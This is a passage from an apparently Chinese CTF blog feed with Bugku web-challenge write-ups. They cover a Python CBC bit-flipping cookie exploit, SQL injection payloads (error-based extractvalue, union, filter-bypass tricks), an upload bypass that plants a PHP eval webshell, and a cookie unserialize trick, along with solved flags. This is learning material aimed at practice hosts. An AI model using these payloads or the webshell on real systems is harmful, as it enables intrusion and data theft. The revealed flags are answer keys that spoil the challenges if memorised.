class="line"><span class="keyword">print</span> r2.text</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到修改cipher后，再次访问页面给出了提示解密后的明文的不能被序列化，就是因为我们操纵密文分组1，改变了全部的明文分组1，使之不能被序列化</p><p>我们将plain取出，解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到，我们已经成功的将A翻转成a，但是导致了本组明文乱码</p><p>所以接下来我们要操作的是iv的全部十六位，下面给出所有代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,base64,urllib,re</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49168/"</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">'username'</span>:<span class="string">'Admin'</span>,</span><br><span class="line"><span class="string">'password'</span>:<span class="string">'admin'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(url,data=data)</span><br><span class="line">cookies = requests.utils.dict_from_cookiejar(r.cookies)</span><br><span class="line">cipher = cookies[<span class="string">'cipher'</span>]</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher))</span><br><span class="line">index = <span class="number">9</span></span><br><span class="line">new_cipher = cipher[:index] + chr(ord(cipher[index])^ord(<span class="string">'A'</span>)^ord(<span class="string">'a'</span>)) + cipher[index+<span class="number">1</span>:]</span><br><span class="line">new_cipher = urllib.quote_plus(base64.b64encode(new_cipher))</span><br><span class="line">cookies[<span class="string">'cipher'</span>] = new_cipher</span><br><span class="line"></span><br><span class="line">r2 = requests.get(url,cookies=cookies)</span><br><span class="line">plain = base64.b64decode(re.findall(<span class="string">"base64_decode\('(.*)'\)"</span>,r2.text)[<span class="number">0</span>])</span><br><span class="line">iv = cookies[<span class="string">'iv'</span>]</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">target = <span class="string">'a:2:&#123;s:8:"userna'</span></span><br><span class="line">new_iv = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">new_iv = new_iv + chr(ord(target[i])^ord(plain[i])^ord(iv[i]))</span><br><span class="line">cookies[<span class="string">'iv'</span>] = urllib.quote_plus(base64.b64encode(new_iv))</span><br><span class="line"></span><br><span class="line">r3 = requests.get(url,cookies=cookies)</span><br><span class="line"><span class="keyword">print</span> r3.text</span><br></pre></td></tr></table></figure><p>运行结果</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/CBC字节翻转攻击/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功获得flag</p>]]></content>
    
    <summary type="html">
    
      Bugkuctf-Web
    
    </summary>
    
      <category term="Bugkuctf-Web" scheme="https://Foxgrin.github.io/categories/Bugkuctf-Web/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-Web(3)</title>
    <link href="https://Foxgrin.github.io//posts/63286/"/>
    <id>https://Foxgrin.github.io//posts/63286/</id>
    <published>2018-08-06T08:06:00.000Z</published>
    <updated>2018-08-11T05:43:28.693Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf中的Web题解(三)<a id="more"></a></p><h3 id="这是一个神奇的登录框"><a href="#这是一个神奇的登录框" class="headerlink" title="这是一个神奇的登录框"></a>这是一个神奇的登录框</h3><p>网址：<a href="http://120.24.86.145:9001/sql/" target="_blank" rel="noopener">http://120.24.86.145:9001/sql/</a></p><p>看到登录框，网址又有sql，八成就是sql注入</p><p>试一下用户名输入admin’，没有报错，再试试admin”</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/90.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/92.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现报错了，果然存在sql注入，从报错信息就看出来用户名和密码都被双引号包裹</p><p>那么我们就可以用万能密码登录了</p><p>payloads:admin_name=admin&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/93.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>应该是登录成功了，但是要我们换一个身份登录才能拿到flag</p><p>换个payloads:admin_name=AdMiNhEhE&amp;admin_passwd=1” or “1”=”1&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/93.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>结果还是一样的，看来是只返回了用户名的信息，那干脆就直接利用报错注入注出信息试试</p><p>先爆库</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,database(),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/94.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>库名bugkusql1</p><p>爆表</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/95.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为flag1,whoami</p><p>爆flag1表下的列名</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag1’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/96.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为flag1</p><p>最后爆flag1列下的数据</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(flag1) from flag1),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/97.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>试一下这个是不是flag，发现错误，仔细看才发现flag太长了报错信息没显示全…</p><p>那再试试爆whoami表吧，看看能不能爆出密码</p><p>先爆whoami表下的列名：</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’whoami’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/98.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>列名为w_id,w_name,w_passwd</p><p>爆passwd</p><p>payloads:admin_name=admin” and extractvalue(1,concat(0x3a,(select w_passwd from whoami where w_name=’AdMiNhEhE’),0x3a))#&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/99.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现又太长了…</p><p>仔细一想，用万能密码登录时也是有返回信息的，为什么不用联合注入呢…</p><p>查询列数为2</p><p>payloads:admin_name=0” union select flag1,2 from flag1 #&amp;admin_passwd=&amp;submit=GO+GO+GO</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/100.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>输入flag{ed6b28e684817d9efcaf802979e57aea}，成功</p><h3 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h3><p>网址：<a href="http://120.24.86.145:9004/" target="_blank" rel="noopener">http://120.24.86.145:9004/</a></p><p>一进去页面发现url：<a href="http://120.24.86.145:9004/1ndex.php?id=1" target="_blank" rel="noopener">http://120.24.86.145:9004/1ndex.php?id=1</a></p><p>就尝试修改id值，id=1,2,3,4,5到5的时候提示</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/101.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>存在sql注入漏洞，猜测是数字型注入，注入点是id</p><p>那试一下id=1’，显示error</p><p>猜测可能id被单引号包裹，输入id=1’%23，正确显示信息，那么接下来注出查询列数</p><p>输入id=1’ order by 3%23，显示error，将3改为2，又eroor，改为1，还是error，慌了…估计是把order 或者by给过滤了</p><p>试一下输入id=1’ ^ (length(‘order’)!=0)%23，显示error，说明不是order被过滤</p><p>再试一下输入id=1’ ^ (length(‘or’)!=0)%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/102.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现正确显示信息，说明or被过滤掉了，类似再尝试一下关键词and,select,union，发现都被过滤了</p><p>尝试一下双写可不可以绕过，输入id=1’ oorrder by 2%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/103.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>正确显示信息，说明可能是用函数str_replace进行过滤，那么双写即可绕过</p><p>输入id=1’ oorrder by 3%23，显示error，说明查询列数为2</p><p>接下来就是熟悉爆库</p><p>输入id=0’ uunionnion sselectelect 1,database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/104.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>数据库名：web1002-1</p><p>爆表名</p><p>输入id=0’ uunionnion sselectelect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 </p><p><img src="/img/Bugkuctf-Web/105.png" alt=""></p><p>表名：flag1,hint </p><p>爆列名</p><p>输入id=0’ uunionnion sselectelect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=’flag1’%23 </p><p><img src="/img/Bugkuctf-Web/106.png" alt=""></p><p>列名：flag1,address </p><p>爆flag列下的数据</p><p>输入id=0’ uunionnion sselectelect 1,flag1 from flag1%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/107.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>提交flag{usOwycTju+FTUUzXosjr}发现错误，突然发现提交的地方提示我们flag有两个</p><p>就试着注出address列下的数据</p><p>输入id=0’ uunionnion sselectelect 1,address from flag1%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/108.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>好像发现了新大陆</p><p>点击访问下一关</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/109.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>页面的url提示oncemore，并且get参数又是id，猜测还是sql注入</p><p>输入id=1’</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/110.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>恩？好像隐约看到了报错信息，不过被背景挡住了，没事，看一下源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/111.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>惊喜发现有报错信息，同时也看出来id被单引号包裹，接着试着注出查询列数</p><p>输入id=1’ order by 2%23，正常显示信息，输入id=1’ order by 3%23，报错。所以查询列数为2</p><p>接下来注库名</p><p>输入id=0’ union select 1,database()%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/112.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现union被过滤了，试着双写，没办法绕过</p><p>于是尝试extractvalue报错注入</p><p>输入id=1’ and extractvalue(1,concat(0x3a,database(),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/113.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>成功注入库名：web1002-2 </p><p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/114.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名：class,flag2 </p><p>输入id=1’ and extractvalue(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name=’flag2’),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/115.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>flag2表下列名：flag2,address </p><p>输入id=1’ and extractvalue(1,concat(0x3a,(select flag2 from flag2),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/116.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注出flag：flag{Bugku-sql_6s-2i-4t-bug} </p><p>将B改成小写b，提交成功</p><h3 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h3><p>这题直接给了一个php源文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">output: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure><p>(PS:可能题目文件出了问题，output没有写在源文件中)</p><p>审计后发现是一个加密的过程，给了最后的输出，需要我们自己编写解密的过程，根据加密的过程一步步解密，decrypt代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">$str = base64_decode($str); <span class="comment">// 将encrypt最后的base64加密后的结果进行base64解密</span></span><br><span class="line">$key = md5(<span class="string">'ISCC'</span>); <span class="comment">// 对应encrypt的$key</span></span><br><span class="line">$x = <span class="number">0</span>; <span class="comment">// 对应encrypt的$x</span></span><br><span class="line">$len = strlen($str); <span class="comment">// $最后encrypt得到的$str长度跟原本encrypt传入的$data长度是一致的</span></span><br><span class="line">$klen = strlen($key); <span class="comment">// 对应encrypt的$klen</span></span><br><span class="line">$char = <span class="string">''</span>; <span class="comment">// 对应encrypt的$char</span></span><br><span class="line">$data = <span class="string">''</span>; <span class="comment">// 对应encrypt的$data</span></span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">//对应encrypt的$char赋值过程</span></span><br><span class="line"><span class="keyword">if</span>($x == $klen)&#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= $key[$x];</span><br><span class="line">$x += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i++)&#123; <span class="comment">// 获得$data</span></span><br><span class="line"><span class="keyword">if</span>(ord($str[$i]) &lt; ord($char[$i]))&#123; <span class="comment">// 如果$str的某位的ascii值小于$char的某位的ascii值 </span></span><br><span class="line">$data .= chr((ord($str[$i]) + <span class="number">128</span>) - ord($char[$i])); <span class="comment">// 说明encrypt有求余128</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$data .= chr(ord($str[$i]) - ord($char[$i]));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span>;</span><br><span class="line">$data = decrypt($str);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后获得flag</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/117.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="文件包含2"><a href="#文件包含2" class="headerlink" title="文件包含2"></a>文件包含2</h3><p>网址：<a href="http://118.89.219.210:49166/" target="_blank" rel="noopener">http://118.89.219.210:49166/</a></p><p>页面url：<a href="http://118.89.219.210:49166/index.php?file=hello.php" target="_blank" rel="noopener">http://118.89.219.210:49166/index.php?file=hello.php</a></p><p>熟悉的文件包含，试一下利用php://filter读取index.php源码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/118.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>天真！！！看来貌似过滤了什么，试一下读取hellp.php，还是一样的结果，看来这个方法行不通，怎么办呢，这时候看一下失败页面的源码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/119.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现提示了文件upload.php</p><p>访问<a href="http://118.89.219.210:49166/upload.php" target="_blank" rel="noopener">http://118.89.219.210:49166/upload.php</a></p><p>发现是文件上传，要求只能上传图片文件，burp抓包上传一句话试试</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/120.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现过滤了文件名和类型，但是因为有文件包含，我们只要能将一句话包含在文件上传上去就行，将php文件后缀修改为png，文件类型修改为image/png，上传成功后访问图片所在地址</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/121.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到代码显示了出来，说明是不符合php语法的代码，仔细看发现php代码开头的&lt;?php ?&gt;被过滤了</p><p>那么换一种方法，上传代码为&lt;?=@eval($_POST[‘cmd’]);</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/122.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>上传成功，访问页面为空，说明代码成功执行</p><p>然后再用burp POST参数cmd执行命令</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/123.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>访问this_is_th3_F14g_154f65sd4g35f4d6f43.txt</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/124.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h3><p>网址：<a href="http://120.24.86.145:8002/flagphp/" target="_blank" rel="noopener">http://120.24.86.145:8002/flagphp/</a></p><p>点击页面Login按钮没反应，看一下源代码只是个按钮，用burp试着POST提交user和password参数也没有显示其他的东西，想到题目给的提示：hint，试着访问hint.php，没有结果，题目是flag.php，访问，也没有提示</p><p>一番思考，试着GET参数hint，没想到就给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>); </span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>]; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123; </span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>) </span><br><span class="line">&#123;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=UTF-8"</span>&gt; </span><br><span class="line">&lt;title&gt;Login&lt;/title&gt; </span><br><span class="line">&lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"admin.css"</span> type=<span class="string">"text/css"</span>&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;div class="container" align="center"&gt; </span><br><span class="line">  &lt;form method=<span class="string">"POST"</span> action=<span class="string">"#"</span>&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"user"</span> type=<span class="string">"text"</span> placeholder=<span class="string">"Username"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input name=<span class="string">"password"</span> type=<span class="string">"password"</span> placeholder=<span class="string">"Password"</span>&gt;&lt;/p&gt; </span><br><span class="line">    &lt;p&gt;&lt;input value=<span class="string">"Login"</span> type=<span class="string">"button"</span>/&gt;&lt;/p&gt; </span><br><span class="line">  &lt;/form&gt; </span><br><span class="line">&lt;/div&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">&#125; </span><br><span class="line">$KEY=<span class="string">'ISecer:www.isecer.com'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>那就变成一道代码审计题了，要我们在COOKIE字段中添加ISecer参数，值是$KEY序列化后的值</p><p>先写个demo，把$KEY序列化后的值打印出来</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$KEY = <span class="string">'ISecer:www.isecer.com'</span>;</span><br><span class="line">$cookie = serialize($KEY);</span><br><span class="line"><span class="keyword">echo</span> $cookie;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/125.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后用burp提交cookie</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/126.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没反应…很奇怪，想了很久，看了好久源代码才发现，$KEY值是定义在最后面的，前面是为空的，所以应该提交空字符串的序列化值…很坑</p><p>空字符串序列化值：s:0:””;</p><p>再次burp提交</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/127.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>拿到flag</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>网址：<a href="http://103.238.227.13:10088/" target="_blank" rel="noopener">http://103.238.227.13:10088/</a></p><p>根据题目的提示，这是一个数字型注入，注入点为GET的参数id，过滤了关键词：空格，单引号，双引号，union，–</p><p>空格可以用%0a替代，union被过滤了那么就用题目的意思：报错注入，注释可以用%23代替–</p><p>直接输入?id=1%23试试</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/128.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现正常显示，那么id就没有被引号包裹，其实就无所谓单双引号被过滤了</p><p>那么我们就可以开始爆库了，输入：</p><p>?id=1%0aand%0aextractvalue(1,concat(0x3a,database(),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/129.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>数据库名为sql4</p><p>爆表，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database()),0x3a))%23</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/130.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>表名为temp</p><p>爆列，输入?id=1%0aand%0aextractvalue(1,concat(0x3a,(select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=0x74656d70),0x3a))%23</p><figure class="image-bubble">                <div 